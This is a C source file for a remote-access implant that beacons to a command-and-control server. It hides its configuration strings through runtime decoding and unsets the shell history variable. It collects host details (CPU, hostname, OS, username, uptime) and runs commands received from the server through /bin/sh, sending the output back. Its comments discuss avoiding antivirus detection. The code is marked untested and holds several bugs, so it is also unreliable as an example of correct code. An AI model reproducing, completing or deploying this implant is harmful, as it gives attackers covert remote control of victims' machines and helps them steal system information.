/*
    TODO:
        - Test and debug

*/

#include <bits/posix1_lim.h>
#include <endian.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <sys/select.h>
#include <limits.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <math.h>
#include <unistd.h>
#include <cpuid.h>
#include "libwrapper.h"
#include "macros.h"

// helper defs
char* parseExecOutput(int pipeInt);
char** mergeStrArrays(char *array1[], int array1Len, char *array2[], int array2Len);
char** splitStr(char *str, char delim, int *count);
char* decodeMacro(char *macroEncoded, int *payloadEncoderID);
int parseInt(char *string, int fallback);

// funcs defs
int getPayloadEncoder();
int getProtocol(int *payloadEncoderID);
int getConnection(int protocolID);
double jitterIT(double baseVal, double jitter);
void whileSleep(long sleepTime);
void sleepBeacon();
int retry(int baseDelay, char *method, int currentAttempt, int maxAttemptsCap, int *payloadEncoderID);
C_Scroll fetchTargetInfo(int *payloadEncoderID);
void beacon(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID);

// types
typedef struct {
    const char* methodName;
    int (*methodFunc)(int currentAttempt, int baseDelay);

} retryMethods;

typedef struct {
    const char* commandName;
    int (*beaconCommandFunc)(char *data, int connID, int *payloadEncoderID);

} beaconCommands;

// main
int main() {
    srand(time(NULL)); // Rand seed

    int _payloadEncoderID = getPayloadEncoder();
    int *payloadEncoderID = &_payloadEncoderID;
    if (payloadEncoderID == 0) {
        return 0;

    }

    int protocolID = getProtocol(payloadEncoderID);
    if (protocolID == 0) {
        return 0;

    }

    char *retryMethod = decodeMacro(RETRY_METHOD, payloadEncoderID);
    char *_tmp_retryMethodNone = decodeMacro(RETRY_METHOD_NONE, payloadEncoderID);
    char *_tmp_retryMethodFixed = decodeMacro(RETRY_METHOD_FIXED, payloadEncoderID);
    char *_tmp_retryMethodLinear = decodeMacro(RETRY_METHOD_LINEAR, payloadEncoderID);
    char *_tmp_retryMethodExponential = decodeMacro(RETRY_METHOD_EXPONENTIAL, payloadEncoderID);
    char *_tmp_retryMethodExponentialJitter = decodeMacro(RETRY_METHOD_EXPONENTIAL_JITTER, payloadEncoderID);
    if (
        strcmp(retryMethod, _tmp_retryMethodNone) != 0 &&
        strcmp(retryMethod, _tmp_retryMethodFixed) != 0 &&
        strcmp(retryMethod, _tmp_retryMethodLinear) != 0 && 
        strcmp(retryMethod, _tmp_retryMethodExponential) != 0 && 
        strcmp(retryMethod, _tmp_retryMethodExponentialJitter) != 0
    
    ) {
        retryMethod = decodeMacro(RETRY_METHOD_FIXED, payloadEncoderID);

    }

    // Free the memory: "who allocate, free"
    FreeGoMem(_tmp_retryMethodNone);
    FreeGoMem(_tmp_retryMethodFixed);
    FreeGoMem(_tmp_retryMethodLinear);
    FreeGoMem(_tmp_retryMethodExponential);
    FreeGoMem(_tmp_retryMethodExponentialJitter);

    char *retryDelayStr = RETRY_DELAY;
    int retryDelay = parseInt(retryDelayStr, 5);

    char *retryAttemptsCapStr = RETRY_ATTEMPTS_CAP;
    int retryAttemptsCap = parseInt(retryAttemptsCapStr, 10);

    char *_tmp_histfile = decodeMacro(ENV_HISTFILE, payloadEncoderID);
    unsetenv(_tmp_histfile);
    while (1) {
        sleepBeacon();
        beacon(protocolID, retryDelay, retryAttemptsCap, retryMethod, payloadEncoderID);

    }

    FreeGoMem(retryMethod);
    return 0;

};

int getPayloadEncoder() {
    char payloadEncoderJsonParams[4096] = "";
    char *payloadEncoderName = PAYLOAD_ENCODER_NAME;
    char *payloadEncoderKey = PAYLOAD_ENCODER_KEY;

    char protocolEncoderJsonParams[4096] = "";
    int _tmp_charsWritten = snprintf(payloadEncoderJsonParams, sizeof(payloadEncoderJsonParams), "{\"KEY\": \"%s\"}", payloadEncoderKey);
    if (_tmp_charsWritten >= (int)sizeof(payloadEncoderJsonParams)) {
        return 0; // Params truncated

    }

    int _payloadEncoderID = CreateEncoder(payloadEncoderName, strlen(payloadEncoderName), payloadEncoderJsonParams, strlen(payloadEncoderJsonParams));
    if (_payloadEncoderID == 0) {
        return 0; // Encoder not found or some error occurred

    }

    return _payloadEncoderID;

};

int getProtocol(int *payloadEncoderID) {
    char protocolEncoderJsonParams[8192] = "";
    char *lhost = decodeMacro(LHOST, payloadEncoderID);
    char *lport = decodeMacro(LPORT, payloadEncoderID);
    char *protocolEncoderName = decodeMacro(PROTOCOL_ENCODER_NAME, payloadEncoderID);
    char *protocolEncoderKey = decodeMacro(PROTOCOL_ENCODER_KEY, payloadEncoderID);

    int _tmp_charsWritten = snprintf(protocolEncoderJsonParams, sizeof(protocolEncoderJsonParams), "{\"LHOST\": \"%s\", \"LPORT\": \"%s\", \"FIDELIUS\": \"%s\", \"KEY\": \"%s\"}", lhost, lport, protocolEncoderName, protocolEncoderKey);
    if (_tmp_charsWritten >= (int)sizeof(protocolEncoderJsonParams)) {
        return 0; // Params truncated by snprintf

    }

    char *protocolName = decodeMacro(PROTOCOL_NAME, payloadEncoderID);
    int protocolID = CreateProtocol(protocolName, strlen(protocolName), protocolEncoderJsonParams, strlen(protocolEncoderJsonParams), protocolEncoderName, strlen(protocolEncoderName));
    if (protocolID == 0) {
        return 0; // Some error occurred during protocol creating

    }

    FreeGoMem(lhost);
    FreeGoMem(lport);
    FreeGoMem(protocolEncoderName);
    FreeGoMem(protocolEncoderKey);
    FreeGoMem(protocolName);
    return protocolID;

};

int getConnection(int protocolID) {
    int connectionID = InitArcane(protocolID);
    if (connectionID == 0) {
        return 0; // Some error occurred or protocolID's reffered protocol do not exists

    }

    return connectionID;

};

C_Scroll fetchTargetInfo(int *payloadEncoderID) {
    /*
        NOTES:
            - As it is a basic spell, i'll not set smts like av_data

    */

    C_Scroll botData;
    memset(&botData, 0, sizeof(botData));
    char cpuName[49];
    unsigned int cores = 0, threads = 0, cache = 0;
    double cpuClock = 0.0;
    char _cpuinfoLine[256];

    unsigned int eax, ebx, ecx, edx;
    
    cpuName[0] = '\0';
    for (int i = 0x80000002; i <= (int)0x80000004; i++) {
        if (__get_cpuid(i, &eax, &ebx, &ecx, &edx)) {
            unsigned int *_p = (unsigned int*)(cpuName + (i - 0x80000002) * 16);
            _p[0] = eax; _p[1] = ebx; _p[2] = ecx; _p[3] = edx;

        }

    }

    cpuName[48] = '\0';
    unsigned int _maxLeaf = __get_cpuid_max(0, NULL);
    if (_maxLeaf >= 4) {
        __cpuid_count(4, 0, eax, ebx, ecx, edx);
        threads = ((eax >> 26) & 0x3F) + 1;

        __cpuid_count(0xB, 0, eax, ebx, ecx, edx);
        cores = threads / (ebx & 0xFFF);

        int _i = 0;
        while (1) {
            __cpuid_count(4, _i, eax, ebx, ecx, edx);
            unsigned int cacheType = eax & 0x1F;
            if (cacheType == 0) break; // End of count

            unsigned int _size = (((ebx >> 22) & 0x3FF) + 1) * (((ebx >> 12) & 0x3FF) + 1) * ((ebx & 0xFFF) + 1) * (ecx + 1) / 1024;
            cache += _size;
            _i++;

        }

    }

    char *_tmp_procCpuinfoPath = decodeMacro(PROC_CPUINFO_PATH, payloadEncoderID);
    FILE *_cpuinfo = fopen(_tmp_procCpuinfoPath, "r");
    if (_cpuinfo != NULL) {
        while (fgets(_cpuinfoLine, 256, _cpuinfo)) {
            if (strstr(_cpuinfoLine, "cpu MHz")) {
                sscanf(_cpuinfoLine, "cpu MHz: %lf", &cpuClock);
                break;

            }

        }

        fclose(_cpuinfo);

    }

    strcpy(botData.CPU.Name, cpuName);
    botData.CPU.Cores = cores;
    botData.CPU.Threads = threads;
    botData.CPU.Cache = cache;
    botData.CPU.Clock = (int)cpuClock;
    strcpy(botData.CPU.Arch, "x86_64");

    FreeGoMem(_tmp_procCpuinfoPath);

    char osHostname[128];
    char osName[128];
    char osVersion[128];
    char *osUsername = "";
    double osUptime;

    char *_tmp_hostnamePath = decodeMacro(HOSTNAME_PATH, payloadEncoderID);
    FILE *_hostname = fopen(_tmp_hostnamePath, "r");
    char _hostnameLine[256];
    if (_hostname != NULL) {
        while(fgets(_hostnameLine, 256, _hostname)) {
            sscanf(_hostnameLine, "%s", osHostname);
            break;

        }

        fclose(_hostname);

    }

    char *_tmp_osReleasePath = decodeMacro(OS_RELEASE_PATH, payloadEncoderID);
    FILE *_osRealease = fopen(_tmp_osReleasePath, "r");
    char _osRealeaseLine[512];
    if (_osRealease != NULL) {
        if (fgets(_osRealeaseLine, 512, _osRealease) != NULL) {
            sscanf(_osRealeaseLine, "NAME=\"%s\"", osName);
            sscanf(_osRealeaseLine, "VERSION=\"%s\"", osVersion);
            
        }

        fclose(_osRealease);

    }

    long _limit = sysconf(_SC_GETPW_R_SIZE_MAX);
    if (_limit == -1) _limit = 1024;

    char *_username = malloc(_limit);
    if (_username) {
        if (getlogin_r(_username, _limit) == 0) {
            osUsername = (char*)malloc(strlen(_username) + 1);
            if (osUsername != NULL) {
                strcpy(osUsername, _username);
                free(_username);
                
            }
            
        }

    }

    char *_tmp_uptimePath = decodeMacro(UPTIME_PATH, payloadEncoderID);
    FILE *_uptime = fopen(_tmp_uptimePath, "r");
    char _uptimeLine[512];
    if (_uptime != NULL) {
        if (fgets(_uptimeLine, 512, _uptime) != NULL) {
            sscanf(_uptimeLine, "%lf", &osUptime);

        }

    }

    strcpy(botData.OS.Name, osName);
    strcpy(botData.OS.Version, osVersion);
    strcpy(botData.OS.Arch, "x86");
    strcpy(botData.OS.Hostname, osHostname);
    strcpy(botData.OS.Username, osUsername);
    botData.OS.Uptime = (int)osUptime;

    FreeGoMem(_tmp_osReleasePath);

    return botData;

};

double jitterIT(double baseVal, double jitter) {
    double delta = baseVal * (jitter / 100.0);
    double min = baseVal - delta;
    double max = baseVal + delta;

    double randomVal = (double)rand() / RAND_MAX;
    return min + randomVal * (max - min);

};

void whileSleep(long sleepTime) {
    // This snippet is AI generated but a human developer refined it

    long start = time(NULL);
    long end = start + sleepTime;
    while (time(NULL) < end) {
        struct timeval tv;
        long remainingSecs = end - time(NULL);
        
        if (remainingSecs <= 0) break;

        tv.tv_sec = (remainingSecs < 1) ? 0 : 1;
        tv.tv_usec = 0;

        select(0, NULL, NULL, NULL, &tv);

    }

};

void sleepBeacon() {
    char *beaconTime = BEACON_TIME;
    int baseSleepTime = parseInt(beaconTime, 5);

    char *jitter = JITTER;
    double sleepJitterTime = (double)parseInt(jitter, 58);
    int sleepTime = (int)jitterIT((double)baseSleepTime, sleepJitterTime);

    whileSleep(sleepTime);

};

int _retryMethod_none(int currentAttempt, int baseDelay) {
    return 0;

};

int _retryMethod_fixed(int currentAttempt, int baseDelay) {
    whileSleep(baseDelay);
    return 1;

};

int _retryMethod_linear(int currentAttempt, int baseDelay) {
    int sleepTime = currentAttempt * baseDelay;
    whileSleep(sleepTime);
    return 1;

};

int _retryMethod_exponential(int currentAttempt, int baseDelay) {
    int sleepTime = baseDelay * (int)pow(currentAttempt, 2);
    whileSleep(sleepTime);
    return 1;

};

int _retryMethod_exponentialJitter(int currentAttempt, int baseDelay) {
    char *jitterStr = JITTER;
    double jitter = parseInt(jitterStr, 58);

    int sleepTime = baseDelay * (int)jitterIT((double)(pow(currentAttempt, 2)), jitter);
    whileSleep(sleepTime);
    return 1;

};

int retry(int baseDelay, char* method, int currentAttempt, int maxAttemptsCap, int *payloadEncoderID) {
    if (currentAttempt > maxAttemptsCap) {
        return 0;

    }

    char *_tmp_retryMethodNone = decodeMacro(RETRY_METHOD_NONE, payloadEncoderID);
    char *_tmp_retryMethodFixed = decodeMacro(RETRY_METHOD_FIXED, payloadEncoderID);
    char *_tmp_retryMethodLinear = decodeMacro(RETRY_METHOD_LINEAR, payloadEncoderID);
    char *_tmp_retryMethodExponential = decodeMacro(RETRY_METHOD_EXPONENTIAL, payloadEncoderID);
    char *_tmp_retryMethodExponentialJitter = decodeMacro(RETRY_METHOD_EXPONENTIAL_JITTER, payloadEncoderID);

    retryMethods retryMethodsTable[] = {
        {_tmp_retryMethodNone, _retryMethod_none},
        {_tmp_retryMethodFixed, _retryMethod_fixed},
        {_tmp_retryMethodLinear, _retryMethod_linear},
        {_tmp_retryMethodExponential, _retryMethod_exponential},
        {_tmp_retryMethodExponentialJitter, _retryMethod_exponentialJitter}

    };

    int _methodsCount = sizeof(retryMethodsTable) / sizeof(retryMethodsTable[0]);
    int (*sleepFunc)(int currentAttempt, int baseDelay) = _retryMethod_fixed; // Fallback if method is out of the table range

    for (int i = 0; i < _methodsCount; i++) {
        if (strcmp(method, retryMethodsTable[i].methodName) == 0) {
            sleepFunc = retryMethodsTable[i].methodFunc;
            break;

        }

    }
    
    int retrySleep = sleepFunc(currentAttempt, baseDelay);
    if (retrySleep == 0) {
        return 0;

    }

    FreeGoMem(_tmp_retryMethodNone);
    FreeGoMem(_tmp_retryMethodFixed);
    FreeGoMem(_tmp_retryMethodLinear);
    FreeGoMem(_tmp_retryMethodExponential);
    FreeGoMem(_tmp_retryMethodExponentialJitter);
    return 1;

};

int _beacon_connHandler(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID) {
    int retryCount = 1;
    int connID = getConnection(protocolID);
    while (connID == 0) {
        int retryResult = retry(retryBaseDelay, retryMethod, retryCount, maxAttemptsCap, payloadEncoderID);
        if (retryResult == 0) {
            return 0; // 'none' mode or cap beat

        }

        connID = getConnection(protocolID);
        retryCount++;

    }

    return connID;

};

char* _beacon_receiveHandler(int connID) {
    char *receivedData;
    int receivedDataLen;
    int receiveDataFromC2 = Receive(connID, &receivedData, &receivedDataLen);

    /*
        note: this switch is just for better understanding (dev context)
        compiler must optimize this to smt like:
        
        if val == 1 {
            do nothing
        
        } else {
            free and return
            
        }

    */
    switch (receiveDataFromC2) {
    case 3:
        FreeGoMem(receivedData);
        return NULL; // Malloc failed

    case 2:
        FreeGoMem(receivedData);
        return NULL; // Conn closed

    case 0:
        FreeGoMem(receivedData);
        return NULL; // Smt failed in communication

    }

    return receivedData;

};

int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
    int pipeOut[2];
    pid_t procPID;

    if (pipe(pipeOut) == -1) {
        return 0; // Error in pipe

    }

    procPID = fork();
    if (procPID < 0) {
        char *failMessage = decodeMacro(REQUEST_FROM_C2_FAILED, payloadEncoderID);
        Send(connID, failMessage, strlen(failMessage));
        FreeGoMem(failMessage);
        return 0;

    } else if (procPID == 0) { // The following block looks complex and it's complex hahaha, i take 3 hours to do that s**t D:<
        char *cmd = decodeMacro(BIN_SH_PATH, payloadEncoderID);
        char *_tmp_array1[] = {cmd, "-c"}; // No way that "-c" hardcoded will result in AV Flags, it's just 2 chars
        int _tmp_array1Len = sizeof(_tmp_array1) / sizeof(_tmp_array1[0]);

        int _dataArrayLen;
        char _dataArrayDelim = ' ';
        char **_dataArray = splitStr(data, _dataArrayDelim, &_dataArrayLen);

        char **_cmdArgsRaw = mergeStrArrays(_tmp_array1, _tmp_array1Len, _dataArray, _dataArrayLen);
        char *_cmdArgsTerminator[] = {NULL};
        char **cmdArgs = mergeStrArrays(_cmdArgsRaw, _tmp_array1Len + _dataArrayLen, _cmdArgsTerminator, 1);

        // Redirect stdout/err
        dup2(pipeOut[1], STDOUT_FILENO);
        dup2(pipeOut[1], STDERR_FILENO);

        close(pipeOut[0]);
        close(pipeOut[1]);

        execvp(cmd, cmdArgs);
        _exit(127); // Exit 127 means "Command not found", the _exit instead of exit will not use atexit() handlers, GPT said that it is the convention for subprocess that runs commands

    } else {
        close(pipeOut[1]);

        char *execOutput = parseExecOutput(pipeOut[0]);

        close(pipeOut[0]);

        waitpid(procPID, NULL, 0);

        if (execOutput) {
            int _tmp_sendData = Send(connID, execOutput, strlen(execOutput));
            free(execOutput);
            if (_tmp_sendData != 1) {
                return 0;
            }
        }
    }

    return 1;

};

int _beacon_commands_getBotData(char *data, int connID, int *payloadEncoderID) {
    C_Scroll botData = fetchTargetInfo(payloadEncoderID);
    char *_nothing = "";
    Send(connID, _nothing, strlen(_nothing));
    return SetScroll(connID, &botData);

};

int _beacon_commandHandler(char *data, int connID, int *payloadEncoderID) {
    char *_tmp_beaconCommandsExec = decodeMacro(BEACON_COMMANDS_EXEC, payloadEncoderID);
    char *_tmp_beaconCommandsGetBotData = decodeMacro(BEACON_COMMANDS_GET_BOT_DATA, payloadEncoderID);
    beaconCommands AvaliableCommands[] = {
        {_tmp_beaconCommandsExec, _beacon_commands_exec},
        {_tmp_beaconCommandsGetBotData, _beacon_commands_getBotData}

    };

    uint64_t commandLen;

    memcpy(&commandLen, data, sizeof(uint64_t));
    commandLen = be64toh(commandLen);
    char *commandFromC2 = data + sizeof(uint64_t);

    int commandsCount = sizeof(AvaliableCommands);
    int (*command)(char *data, int connID, int *payloadEncoderID) = NULL;

    for (int i = 0; i < commandsCount; i++) {
        if (strcmp(AvaliableCommands[i].commandName, commandFromC2) == 0) {
            command = AvaliableCommands[i].beaconCommandFunc;
            break;

        }

    }

    if (command == NULL) {
        FreeGoMem(_tmp_beaconCommandsGetBotData);
        FreeGoMem(_tmp_beaconCommandsExec);

        return 0; // Command Not Found

    }

    int commandExec = command(data, connID, payloadEncoderID);
    if (commandExec == 0) {
        FreeGoMem(_tmp_beaconCommandsGetBotData);
        FreeGoMem(_tmp_beaconCommandsExec);

        return 0; // Some error occurred

    }

    FreeGoMem(_tmp_beaconCommandsGetBotData);
    FreeGoMem(_tmp_beaconCommandsExec);

    return 1;

};

void beacon(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID) {
    int connID = _beacon_connHandler(protocolID, retryBaseDelay, maxAttemptsCap, retryMethod, payloadEncoderID);
    if (connID == 0) {
        return; // 'none' mode or cap beat

    }

    char *dataFromC2 = _beacon_receiveHandler(connID);
    if (dataFromC2 == NULL) {
        return; // Some error occurred
        
    }

    int handleCommand = _beacon_commandHandler(dataFromC2, connID, payloadEncoderID);
    
    FreeGoMem(dataFromC2);
    Close(connID);

};

// helpers
int parseInt(char* string, int fallback) {
    char *end;
    long longFromStr = strtol(string, &end, 10);
    if (*end != '\0' || longFromStr > INT_MAX || longFromStr < INT_MIN) {
        return fallback;

    }

    return (int)longFromStr;

};

char* decodeMacro(char* macroEncoded, int *payloadEncoderID) {
    _go_base64 macroDecodedB64 = _b64_d(macroEncoded);
    if (macroDecodedB64.data == NULL) {
        _exit(1); // Can't parse smt, quit to avoid trouble

    }

    int maxAttempts = 5;
    int currentAttempt = 0;
    unsigned char *_decodedMacro = NULL;
    int _decodedMacroStatus = 0;
    while (_decodedMacroStatus == 0 && currentAttempt < maxAttempts) {
        DestroyEncoder(*payloadEncoderID);
        *payloadEncoderID = getPayloadEncoder();
        int _decodedMacroLen = 0;
        _decodedMacroStatus = Decode(*payloadEncoderID, macroDecodedB64.data, macroDecodedB64.len, &_decodedMacro, &_decodedMacroLen);

    }

    return (char*)_decodedMacro;

};

char** splitStr(char *str, char delim, int *count) {
    char **newStr = NULL;
    int tokens = 0;
    const char *start = str;
    const char *p = str;

    while (*p) {
        if (*p == delim) {
            int partlen = p - start;
            char *token = (char*)malloc(partlen + 1); // needs to be free by caller
            memcpy(token, start, partlen);
            token[partlen] = '\0';

            newStr = (char**)realloc(newStr, sizeof(char*) * (tokens + 1));
            newStr[tokens++] = token;
            start = p + 1;

        }

        p++;

    }

    if (start != p) { // note: this is for the last token :3. I think that we can do that in while but this implementation already looks good :D
        int partlen = p - start;
        char *token = (char*)malloc(partlen + 1); // same thing
        memcpy(token, start, partlen);
        token[partlen] = '\0';

        newStr = (char**)realloc(newStr, sizeof(char*) * (tokens + 1));
        newStr[tokens++] = token;

    }

    *count = tokens;
    return newStr;

};

char** mergeStrArrays(char *array1[], int array1Len, char *array2[], int array2Len) {
    int newArrayLen = array1Len + array2Len;
    char **newArray = malloc(newArrayLen * sizeof(char*));
    if (newArray == NULL) {
        return NULL;

    }

    memcpy(newArray, array1, array1Len * sizeof(char*));
    memcpy(newArray, array2, array2Len * sizeof(char*));

    return newArray;
    
};

char* parseExecOutput(int pipeInt) {
    size_t bufferCap = 65536; // 64KB in init, can be higher
    size_t bufferLen = 0;
    char *buffer = malloc(bufferCap);
    if (buffer == NULL) {
        return NULL;

    }

    char _tmp[4096];
    ssize_t _n;

    while ((_n = read(pipeInt, _tmp, sizeof(_tmp))) > 0) {
        if ((bufferLen + _n) > bufferCap) {
            bufferCap *= 2;
            char *newBuffer = realloc(buffer, bufferCap);
            if (newBuffer == NULL) {
                free(buffer);
                return NULL;

            }

            buffer = newBuffer;

        }

        memcpy(buffer + bufferLen, _tmp, _n);
        bufferLen += _n;

    }

    buffer[bufferLen] = '\0';
    return buffer;

};
